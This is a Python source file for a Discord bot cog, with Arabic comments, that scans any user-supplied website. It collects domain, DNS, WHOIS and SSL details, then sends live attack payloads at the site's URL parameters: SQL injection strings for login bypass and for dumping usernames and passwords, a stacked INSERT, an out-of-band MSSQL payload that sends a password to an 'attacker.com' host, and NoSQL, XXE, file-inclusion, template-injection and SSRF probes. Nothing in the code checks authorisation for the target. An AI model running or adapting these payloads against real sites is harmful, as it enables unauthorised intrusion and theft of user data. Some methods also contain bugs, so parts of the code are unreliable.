import discord
from discord.ext import commands
import requests
import re
import socket
import ssl
import dns.resolver
import whois
import subprocess
import asyncio
import aiohttp
from urllib.parse import urlparse, parse_qs
import json
from datetime import datetime
import xml.etree.ElementTree as ET
from bs4 import BeautifulSoup
import logging
from config import SCAN_CHANNEL_ID

class AdvancedVulnerabilityChecks:
    def __init__(self):
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

    async def check_ssrf(self, url, param):
        vulns = []
        try:
            # استخراج البيلود من الرابط نفسه
            parsed_url = urlparse(url)
            original_payload = parse_qs(parsed_url.query).get(param, [''])[0]
            
            # قائمة البيلود المحتملة
            ssrf_variations = [
                original_payload,
                original_payload + '/',
                'http://' + original_payload if not original_payload.startswith('http') else original_payload,
                original_payload.replace('http://', 'https://'),
                original_payload + '.localhost',
                original_payload + ':80',
                original_payload + ':443',
                original_payload.replace('www.', 'internal.'),
                f"http://{original_payload}@localhost",
                f"http://localhost@{original_payload}",
                original_payload + '/admin',
                original_payload + '/internal',
                original_payload + '/api'
            ]
            
            for payload in ssrf_variations:
                try:
                    test_url = f"{url}?{param}={payload}"
                    async with aiohttp.ClientSession() as session:
                        async with session.get(test_url, headers=self.headers, timeout=5) as response:
                            content = await response.text()
                            
                            # فحص الاستجابة للكشف عن SSRF
                            if any(indicator in content.lower() for indicator in [
                                'internal', 'localhost', '127.0.0.1', 
                                'private', 'admin', 'root', 'config',
                                'aws', 'metadata', 'credentials'
                            ]):
                                vulns.append({
                                    'type': 'SSRF',
                                    'severity': 'عالية',
                                    'details': f'تم اكتشاف إمكانية SSRF باستخدام: {payload}',
                                    'payload': payload,
                                    'url': test_url,
                                    'fix': '''
                                    1. التحقق من صحة URL المدخل
                                    2. استخدام قائمة بيضاء للنطاقات المسموح بها
                                    3. حظر الوصول للشبكات الداخلية
                                    4. تطبيق WAF مع قواعد SSRF
                                    5. استخدام DNS Resolution Check
                                    '''
                                })
                except asyncio.TimeoutError:
                    # قد يكون مؤشراً على SSRF ناجح
                    vulns.append({
                        'type': 'SSRF',
                        'severity': 'متوسطة',
                        'details': f'تأخير مشبوه في الاستجابة مع: {payload}',
                        'payload': payload,
                        'url': test_url
                    })
                except Exception as e:
                    continue
                    
        except Exception as e:
            self.logger.error(f"Error in SSRF check: {str(e)}")
        
        return vulns

    async def check_file_inclusion(self, url, param):
        vulns = []
        lfi_payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '/etc/passwd\0'
        ]
        
        for payload in lfi_payloads:
            try:
                test_url = f"{url}?{param}={payload}"
                async with aiohttp.ClientSession() as session:
                    async with session.get(test_url, headers=self.headers) as response:
                        content = await response.text()
                        if 'root:' in content:
                            vulns.append({
                                'type': 'File Inclusion',
                                'severity': 'عالية',
                                'details': 'تم اكتشاف إمكانية Local File Inclusion'
                            })
            except:
                continue
        return vulns

class DomainAnalyzer:
    def __init__(self):
        self.logger = logging.getLogger('DomainAnalyzer')

    async def analyze_domain(self, domain: str):
        results = {
            'basic_info': {},
            'dns_records': {},
            'security_info': {},
            'whois_info': {},
            'ssl_info': {},
            'ip_info': {}
        }
        
        try:
            # تنظيف الدومين
            domain = self._clean_domain(domain)
            
            # الحصول على معلومات IP
            ip_addresses = await self._get_ip_addresses(domain)
            results['ip_info'] = {
                'addresses': ip_addresses,
                'geolocation': await self._get_ip_geolocation(ip_addresses[0]) if ip_addresses else None
            }
            
            # DNS Records تحليل
            results['dns_records'] = await self._analyze_dns_records(domain)
            
            # WHOIS معلومات
            results['whois_info'] = await self._get_whois_info(domain)
            
            # SSL شهادة
            results['ssl_info'] = await self._check_ssl_certificate(domain)
            
            # فحوصات أمنية إضافية
            results['security_info'] = await self._check_security_headers(domain)
            
            return results
            
        except Exception as e:
            self.logger.error(f"Error analyzing domain {domain}: {str(e)}")
            return results

    def _clean_domain(self, domain: str) -> str:
        """تنظيف الدومين من البروتوكول والمسارات"""
        domain = domain.lower()
        domain = domain.replace('http://', '').replace('https://', '')
        domain = domain.split('/')[0]
        return domain

    async def _get_ip_addresses(self, domain: str) -> list:
        """الحصول على عناوين IP للدومين"""
        try:
            ips = []
            # IPv4 فحص
            try:
                answers = dns.resolver.resolve(domain, 'A')
                ips.extend([str(answer) for answer in answers])
            except:
                pass
                
            # IPv6 فحص
            try:
                answers = dns.resolver.resolve(domain, 'AAAA')
                ips.extend([str(answer) for answer in answers])
            except:
                pass
                
            return ips
        except Exception as e:
            self.logger.error(f"Error getting IP addresses for {domain}: {str(e)}")
            return []

    async def _get_ip_geolocation(self, ip: str) -> dict:
        """الحصول على الموقع الجغرافي لعنوان IP"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'http://ip-api.com/json/{ip}') as response:
                    return await response.json()
        except Exception as e:
            self.logger.error(f"Error getting geolocation for IP {ip}: {str(e)}")
            return {}

    async def _analyze_dns_records(self, domain: str) -> dict:
        """DNS تحليل سجلات"""
        records = {}
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 'PTR', 'SRV', 'SPF']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                records[record_type] = [str(answer) for answer in answers]
            except:
                records[record_type] = []
                
        return records

    async def _get_whois_info(self, domain: str) -> dict:
        """WHOIS الحصول على معلومات"""
        try:
            w = whois.whois(domain)
            return {
                'registrar': w.registrar,
                'creation_date': str(w.creation_date),
                'expiration_date': str(w.expiration_date),
                'last_updated': str(w.updated_date),
                'status': w.status,
                'name_servers': w.name_servers,
                'emails': w.emails,
                'org': w.org
            }
        except Exception as e:
            self.logger.error(f"Error getting WHOIS info for {domain}: {str(e)}")
            return {}

    async def _check_ssl_certificate(self, domain: str) -> dict:
        """SSL فحص شهادة"""
        try:
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    return {
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'subject': dict(x[0] for x in cert['subject']),
                        'version': cert['version'],
                        'serial_number': cert['serialNumber'],
                        'not_before': cert['notBefore'],
                        'not_after': cert['notAfter'],
                        'san': cert.get('subjectAltName', []),
                        'is_valid': True
                    }
        except Exception as e:
            self.logger.error(f"Error checking SSL certificate for {domain}: {str(e)}")
            return {'is_valid': False, 'error': str(e)}

    async def _check_security_headers(self, domain: str) -> dict:
        """فحص رؤوس الأمان"""
        security_headers = {
            'Strict-Transport-Security': 'HSTS غير مفعل',
            'Content-Security-Policy': 'CSP غير مفعل',
            'X-Frame-Options': 'X-Frame-Options غير مفعل',
            'X-Content-Type-Options': 'X-Content-Type-Options غير مفعل',
            'X-XSS-Protection': 'X-XSS-Protection غير مفعل',
            'Referrer-Policy': 'Referrer-Policy غير مفعل'
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://{domain}') as response:
                    headers = response.headers
                    for header in security_headers:
                        if header in headers:
                            security_headers[header] = headers[header]
                            
            return security_headers
        except Exception as e:
            self.logger.error(f"Error checking security headers for {domain}: {str(e)}")
            return security_headers

class AdvancedSecurityScanner(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.logger = logging.getLogger('SecurityScanner')
        self.domain_analyzer = DomainAnalyzer()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'
        }
        self.advanced_checks = AdvancedVulnerabilityChecks()
        
    async def deep_scan_parameters(self, url, params):
        vulnerabilities = []
        
        # فحص كل معامل في URL
        for param, value in params.items():
            # SQL Injection فحص متقدم لـ
            sql_vulns = await self.advanced_sql_injection_check(url, param)
            vulnerabilities.extend(sql_vulns)
            
            # NoSQL Injection فحص
            nosql_vulns = await self.check_nosql_injection(url, param)
            vulnerabilities.extend(nosql_vulns)
            
            # فحص حقن XML
            xml_vulns = await self.check_xml_injection(url, param)
            vulnerabilities.extend(xml_vulns)
            
            # فحص حقن التعليمات البرمجية
            code_vulns = await self.check_code_injection(url, param)
            vulnerabilities.extend(code_vulns)
            
        return vulnerabilities

    async def advanced_sql_injection_check(self, url, param):
        vulns = []
        advanced_payloads = {
            # Authentication Bypass
            "' OR '1'='1": {
                "type": "SQL Injection - Authentication Bypass",
                "detection": "auth_bypass",
                "description": "محاولة تجاوز صفحة تسجيل الدخول",
                "severity": "عالية جداً"
            },
            "admin' --": {
                "type": "SQL Injection - Authentication Bypass",
                "detection": "auth_bypass",
                "description": "محاولة تسجيل الدخول كمسؤول",
                "severity": "عالية جداً"
            },
            "admin' #": {
                "type": "SQL Injection - Authentication Bypass",
                "detection": "auth_bypass",
                "description": "محاولة تسجيل الدخول كمسؤول باستخدام تعليق #",
                "severity": "عالية جداً"
            },
            
            # Comment Injection
            "'; -- comment": {
                "type": "SQL Injection - Comment Injection",
                "detection": "comment_pattern",
                "description": "حقن تعليقات SQL لتعطيل جزء من الاستعلام",
                "severity": "عالية"
            },
            "'; # comment": {
                "type": "SQL Injection - Comment Injection",
                "detection": "comment_pattern",
                "description": "حقن تعليقات SQL باستخدام #",
                "severity": "عالية"
            },
            "/**/; SELECT * FROM users": {
                "type": "SQL Injection - Comment Injection",
                "detection": "comment_pattern",
                "description": "استخدام تعليقات متعددة الأسطر",
                "severity": "عالية"
            },
            
            # Admin Login Bypass
            "admin' OR '1'='1'": {
                "type": "SQL Injection - Admin Login Bypass",
                "detection": "admin_bypass",
                "description": "محاولة تجاوز تسجيل دخول المسؤول",
                "severity": "عالية جداً"
            },
            "' or 1=1 limit 1 -- -+": {
                "type": "SQL Injection - Admin Login Bypass",
                "detection": "admin_bypass",
                "description": "محاولة تجاوز تسجيل الدخول مع تحديد أول صف",
                "severity": "عالية جداً"
            },
            "admin')-- -": {
                "type": "SQL Injection - Admin Login Bypass",
                "detection": "admin_bypass",
                "description": "محاولة تجاوز تسجيل دخول المسؤول باستخدام أقواس",
                "severity": "عالية جداً"
            },
            
            # Union Based (Enhanced)
            "' UNION SELECT username,password FROM users-- -": {
                "type": "SQL Injection - Union Based",
                "detection": "union_pattern",
                "description": "محاولة استخراج بيانات المستخدمين",
                "severity": "عالية جداً"
            },
            "' UNION SELECT null,table_name FROM information_schema.tables-- -": {
                "type": "SQL Injection - Union Based",
                "detection": "union_pattern",
                "description": "محاولة استخراج أسماء الجداول",
                "severity": "عالية جداً"
            },
            "' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users'-- -": {
                "type": "SQL Injection - Union Based",
                "detection": "union_pattern",
                "description": "محاولة استخراج أسماء الأعمدة",
                "severity": "عالية جداً"
            },
            "' UNION SELECT null,concat(username,':',password) FROM users-- -": {
                "type": "SQL Injection - Union Based",
                "detection": "union_pattern",
                "description": "محاولة استخراج بيانات المستخدمين مع الدمج",
                "severity": "عالية جداً"
            },
            
            # Error-based SQL Injection
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -": {
                "type": "Error-based SQL Injection (MySQL)",
                "detection": "error_pattern",
                "description": "استغلال وظيفة UPDATEXML لاستخراج البيانات"
            },
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -": {
                "type": "Error-based SQL Injection (MySQL)",
                "detection": "error_pattern",
                "description": "استغلال وظيفة EXTRACTVALUE لاستخراج البيانات"
            },
            
            # Boolean-based SQL Injection
            "' AND 1=1-- -": {
                "type": "Boolean-based SQL Injection",
                "detection": "boolean_pattern",
                "description": "استغلال الاستجابات المنطقية TRUE/FALSE"
            },
            "' AND 1=2-- -": {
                "type": "Boolean-based SQL Injection",
                "detection": "boolean_pattern",
                "description": "استغلال الاستجابات المنطقية TRUE/FALSE"
            },
            
            # Time-based SQL Injection
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -": {
                "type": "Time-based SQL Injection (MySQL)",
                "detection": "time_delay",
                "description": "استغلال التأخير الزمني للكشف عن الثغرة"
            },
            "'; WAITFOR DELAY '0:0:5'-- -": {
                "type": "Time-based SQL Injection (MSSQL)",
                "detection": "time_delay",
                "description": "استغلال التأخير الزمني في MSSQL"
            },
            
            # Stacked Queries
            "'; INSERT INTO users VALUES ('hacked','hacked')-- -": {
                "type": "Stacked Queries SQL Injection",
                "detection": "stacked_queries",
                "description": "محاولة تنفيذ استعلامات متعددة"
            },
            
            # Out-of-band SQL Injection
            "'; DECLARE @q VARCHAR(8000);SET @q=CONCAT((SELECT TOP 1 password FROM users FOR XML PATH(''')),'.attacker.com');EXEC('master..xp_dirtree ''\\\\'+@q);-- -": {
                "type": "Out-of-band SQL Injection (MSSQL)",
                "detection": "oob_pattern",
                "description": "محاولة إرسال البيانات لخادم خارجي"
            }
        }

        for payload, info in advanced_payloads.items():
            try:
                test_url = f"{url}?{param}={payload}"
                start_time = datetime.now()
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(test_url, headers=self.headers) as response:
                        content = await response.text()
                        response_time = (datetime.now() - start_time).total_seconds()
                        
                        # تحليل الاستجابة حسب نوع الحقن
                        if info["detection"] == "auth_bypass" and any(success in content.lower() for success in [
                            'welcome admin', 'dashboard', 'logged in', 'successful login',
                            'admin panel', 'control panel', 'authenticated'
                        ]):
                            vulns.append(self._create_vuln_entry(info, payload, test_url))
                            
                        elif info["detection"] == "comment_pattern" and any(err in content.lower() for err in [
                            'sql syntax', 'mysql error', 'syntax error',
                            'unterminated comment', 'comment not terminated'
                        ]):
                            vulns.append(self._create_vuln_entry(info, payload, test_url))
                            
                        elif info["detection"] == "admin_bypass" and any(success in content.lower() for success in [
                            'admin', 'dashboard', 'control panel', 'management',
                            'administrator', 'superuser', 'root'
                        ]):
                            vulns.append(self._create_vuln_entry(info, payload, test_url))
                            
                        elif info["detection"] == "union_pattern" and any(indicator in content.lower() for indicator in [
                            'username', 'password', 'email', 'user_id',
                            'admin', 'root', 'information_schema'
                        ]):
                            vulns.append(self._create_vuln_entry(info, payload, test_url))

            except Exception as e:
                self.logger.error(f"Error testing SQL injection payload: {str(e)}")
                continue

        return vulns

    def _create_vuln_entry(self, info, payload, test_url):
        fixes = {
            "SQL Injection - Authentication Bypass": '''
            1. استخدام Prepared Statements للتحقق من المصادقة
            2. تطبيق التحقق من صحة المدخلات بشكل صارم
            3. استخدام وظائف التشفير للكلمات السرية
            4. تطبيق نظام مصادقة متعدد العوامل
            5. تسجيل محاولات تسجيل الدخول الفاشلة
            ''',
            "SQL Injection - Comment Injection": '''
            1. تنظيف المدخلات من علامات التعليقات
            2. استخدام Parameterized Queries
            3. تطبيق White-list للمدخلات المسموح بها
            4. تقييد استخدام الرموز الخاصة
            ''',
            "SQL Injection - Admin Login Bypass": '''
            1. استخدام نظام مصادقة قوي
            2. تطبيق Rate Limiting على محاولات تسجيل الدخول
            3. استخدام CAPTCHA للحماية من المحاولات المتكررة
            4. تشفير كلمات المرور باستخدام خوارزميات قوية
            5. تطبيق سياسة كلمات مرور قوية
            ''',
            "SQL Injection - Union Based": '''
            1. استخدام ORM للتعامل مع قاعدة البيانات
            2. تطبيق Prepared Statements
            3. تقييد صلاحيات قاعدة البيانات
            4. تشفير البيانات الحساسة
            5. تطبيق WAF مع قواعد خاصة بـ UNION-based attacks
            '''
        }

        return {
            'type': info["type"],
            'severity': info.get("severity", "عالية"),
            'details': info["description"],
            'payload': payload,
            'url': test_url,
            'fix': fixes.get(info["type"], "يرجى اتباع إرشادات الأمان العامة")
        }

    async def _get_response_content(self, url, param, payload):
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{url}?{param}={payload}", headers=self.headers) as response:
                return await response.text()

    async def check_nosql_injection(self, url, param):
        vulns = []
        nosql_payloads = {
            '{"$gt": ""}': "NoSQL Injection - Greater Than",
            '{"$ne": null}': "NoSQL Injection - Not Equal",
            '{"$where": "sleep(5000)"}': "NoSQL Injection - Command Injection"
        }

        for payload, attack_type in nosql_payloads.items():
            try:
                test_url = f"{url}?{param}={payload}"
                async with aiohttp.ClientSession() as session:
                    async with session.get(test_url, headers=self.headers) as response:
                        if response.status != 404:
                            vulns.append({
                                'type': 'NoSQL Injection',
                                'subtype': attack_type,
                                'severity': 'عالية',
                                'param': param,
                                'payload': payload,
                                'details': 'تم اكتشاف إمكانية حقن NoSQL',
                                'fix': '''
                                1. استخدام التحقق من صحة المدخلات
                                2. تطبيق Schema Validation
                                3. استخدام MongoDB Sanitize
                                4. تقييد صلاحيات قاعدة البيانات
                                '''
                            })
            except:
                continue

        return vulns

    async def check_xml_injection(self, url, param):
        vulns = []
        xml_payloads = {
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>': "XXE Injection",
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>': "XXE DoS Attack"
        }

        for payload, attack_type in xml_payloads.items():
            try:
                headers = self.headers.copy()
                headers['Content-Type'] = 'application/xml'
                
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, data=payload, headers=headers) as response:
                        content = await response.text()
                        if any(indicator in content for indicator in ['root:', 'daemon:', '[SYSTEM']):
                            vulns.append({
                                'type': 'XML Injection',
                                'subtype': attack_type,
                                'severity': 'عالية جداً',
                                'param': param,
                                'payload': payload,
                                'details': 'تم اكتشاف ثغرة XML External Entity (XXE)',
                                'fix': '''
                                1. تعطيل XML External Entity
                                2. تحديث مكتبات XML
                                3. استخدام XML Schema Validation
                                4. تطبيق White-listing للمدخلات
                                '''
                            })
            except:
                continue

        return vulns

    async def check_code_injection(self, url, param):
        vulns = []
        code_payloads = {
            ';phpinfo();': "PHP Code Injection",
            '{{7*7}}': "Template Injection",
            '${7*7}': "Expression Language Injection",
            'sleep(10)': "Python Code Injection"
        }

        for payload, attack_type in code_payloads.items():
            try:
                test_url = f"{url}?{param}={payload}"
                start_time = datetime.now()
                async with aiohttp.ClientSession() as session:
                    async with session.get(test_url, headers=self.headers) as response:
                        content = await response.text()
                        response_time = (datetime.now() - start_time).total_seconds()

                if '49' in content or response_time > 10:
                    vulns.append({
                        'type': 'Code Injection',
                        'subtype': attack_type,
                        'severity': 'عالية جداً',
                        'param': param,
                        'payload': payload,
                        'details': f'تم اكتشاف إمكانية حقن التعليمات البرمجية - {attack_type}',
                        'fix': '''
                        1. استخدام Input Validation
                        2. تطبيق Output Encoding
                        3. استخدام Safe Templates
                        4. تقييد تنفيذ التعليمات البرمجية
                        5. تطبيق Content Security Policy
                        '''
                    })
            except:
                continue

        return vulns

    async def check_basic_vulnerabilities(self, url, session):
        vulns = []
        try:
            # فحص نوع البروتوكول
            if url.startswith('https://'):
                vulns.append({
                    'type': 'SSL/TLS',
                    'severity': 'منخفضة',
                    'details': 'الموقع يستخدم HTTPS (آمن)'
                })
            else:
                vulns.append({
                    'type': 'SSL/TLS',
                    'severity': 'عالية',
                    'details': 'الموقع يستخدم HTTP (غير آمن) - يُنصح بالتحويل إلى HTTPS'
                })
            
            # فحص Headers الأمنية
            async with session.get(url, headers=self.headers) as response:
                headers = response.headers
                
                if 'X-Frame-Options' not in headers:
                    vulns.append({
                        'type': 'Missing Security Headers',
                        'severity': 'متوسطة',
                        'details': 'X-Frame-Options header غير موجود (خطر Clickjacking)'
                    })
                
                if 'Content-Security-Policy' not in headers:
                    vulns.append({
                        'type': 'Missing Security Headers',
                        'severity': 'متوسطة',
                        'details': 'Content-Security-Policy header غير موجود'
                    })
                    
        except Exception as e:
            self.logger.error(f'Error in basic vulnerability check: {str(e)}')
        
        return vulns

    async def scan_website(self, interaction: discord.Interaction, url: str, quick: bool = False):
        """فحص الموقع وإرسال النتائج في التذكرة"""
        try:
            # رسالة البدء
            status_embed = discord.Embed(
                title="🔍 جاري الفحص...",
                description=f"جاري فحص الموقع: {url}\nنوع الفحص: {'سريع' if quick else 'شامل'}",
                color=discord.Color.blue()
            )
            status_embed.set_footer(text="Made By Just Me Discord : _50q Or Rl-Store")
            await interaction.followup.send(embed=status_embed)

            # تحليل الدومين
            domain = urlparse(url).netloc
            domain_info = await self.domain_analyzer.analyze_domain(domain)

            # إنشاء Embed لمعلومات الدومين
            domain_embed = discord.Embed(
                title="📊 معلومات الدومين",
                color=discord.Color.blue()
            )

            # IP معلومات
            if domain_info['ip_info']['addresses']:
                ip_addresses = '\n'.join(domain_info['ip_info']['addresses'])
                domain_embed.add_field(
                    name="🌐 عناوين IP",
                    value=f"```\n{ip_addresses}\n```",
                    inline=False
                )

            # معلومات الموقع الجغرافي
            if domain_info['ip_info']['geolocation']:
                geo = domain_info['ip_info']['geolocation']
                geo_info = f"الدولة: {geo.get('country', 'غير معروف')}\n"
                geo_info += f"المدينة: {geo.get('city', 'غير معروف')}\n"
                geo_info += f"المنطقة: {geo.get('regionName', 'غير معروف')}\n"
                geo_info += f"مزود الخدمة: {geo.get('isp', 'غير معروف')}"
                domain_embed.add_field(
                    name="📍 الموقع الجغرافي",
                    value=f"```\n{geo_info}\n```",
                    inline=False
                )

            # DNS سجلات
            if domain_info['dns_records']:
                dns_info = ""
                for record_type, records in domain_info['dns_records'].items():
                    if records:
                        dns_info += f"{record_type}: {', '.join(records)}\n"
                if dns_info:
                    domain_embed.add_field(
                        name="🔍 DNS سجلات",
                        value=f"```\n{dns_info}\n```",
                        inline=False
                    )

            # WHOIS معلومات
            if domain_info['whois_info']:
                whois_info = f"المسجل: {domain_info['whois_info'].get('registrar', 'غير معروف')}\n"
                whois_info += f"تاريخ الإنشاء: {domain_info['whois_info'].get('creation_date', 'غير معروف')}\n"
                whois_info += f"تاريخ الانتهاء: {domain_info['whois_info'].get('expiration_date', 'غير معروف')}"
                domain_embed.add_field(
                    name="📋 WHOIS معلومات",
                    value=f"```\n{whois_info}\n```",
                    inline=False
                )

            # SSL معلومات
            if domain_info['ssl_info'].get('is_valid'):
                ssl_info = f"المصدر: {domain_info['ssl_info']['issuer'].get('O', 'غير معروف')}\n"
                ssl_info += f"صالح حتى: {domain_info['ssl_info']['not_after']}\n"
                ssl_info += f"الإصدار: {domain_info['ssl_info']['version']}"
                domain_embed.add_field(
                    name="🔒 SSL شهادة",
                    value=f"```\n{ssl_info}\n```",
                    inline=False
                )

            # رؤوس الأمان
            security_headers = domain_info['security_info']
            headers_info = ""
            for header, value in security_headers.items():
                headers_info += f"{header}: {value}\n"
            domain_embed.add_field(
                name="🛡️ رؤوس الأمان",
                value=f"```\n{headers_info}\n```",
                inline=False
            )

            domain_embed.set_footer(text="Made By Just Me Discord : _50q Or Rl-Store")
            await interaction.followup.send(embed=domain_embed)

            vulnerabilities = []
            async with aiohttp.ClientSession() as session:
                # الفحوصات الأساسية دائماً
                basic_vulns = await self.check_basic_vulnerabilities(url, session)
                vulnerabilities.extend(basic_vulns)

                if not quick:
                    # فحوصات إضافية للفحص الشامل
                    parsed_url = urlparse(url)
                    params = parse_qs(parsed_url.query)
                    if params:
                        deep_vulns = await self.deep_scan_parameters(url, params)
                        vulnerabilities.extend(deep_vulns)

            # تصنيف النتائج حسب الخطورة
            severity_order = {'عالية جداً': 0, 'عالية': 1, 'متوسطة': 2, 'منخفضة': 3}
            vulnerabilities.sort(key=lambda x: severity_order.get(x['severity'], 999))

            # إنشاء تقرير النتائج
            result_embed = discord.Embed(
                title="📊 نتائج الفحص الأمني",
                description=f"تم فحص الموقع: {url}",
                color=discord.Color.green() if not vulnerabilities else discord.Color.red()
            )

            if not vulnerabilities:
                result_embed.add_field(
                    name="✅ نتيجة الفحص",
                    value="لم يتم اكتشاف أي ثغرات أمنية واضحة",
                    inline=False
                )
            else:
                for vuln in vulnerabilities:
                    severity_emoji = {
                        'عالية جداً': '🔴',
                        'عالية': '🟠',
                        'متوسطة': '🟡',
                        'منخفضة': '🟢'
                    }.get(vuln['severity'], '⚪')
                    
                    field_name = f"{severity_emoji} {vuln['type']}"
                    field_value = f"**الخطورة:** {vuln['severity']}\n"
                    field_value += f"**التفاصيل:** {vuln['details']}\n"
                    
                    if 'fix' in vuln:
                        field_value += f"**الحل المقترح:**\n{vuln['fix']}"
                    
                    result_embed.add_field(
                        name=field_name,
                        value=field_value,
                        inline=False
                    )

            result_embed.set_footer(text=f"نوع الفحص: {'سريع' if quick else 'شامل'} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Made By Just Me Discord : _50q Or Rl-Store")
            await interaction.followup.send(embed=result_embed)

        except Exception as e:
            self.logger.error(f"Error in scan_website: {str(e)}")
            error_embed = discord.Embed(
                title="❌ خطأ في الفحص",
                description=f"حدث خطأ أثناء فحص الموقع: {str(e)}",
                color=discord.Color.red()
            )
            error_embed.set_footer(text="Made By Just Me Discord : _50q Or Rl-Store")
            await interaction.followup.send(embed=error_embed)

async def setup(bot):
    await bot.add_cog(AdvancedSecurityScanner(bot))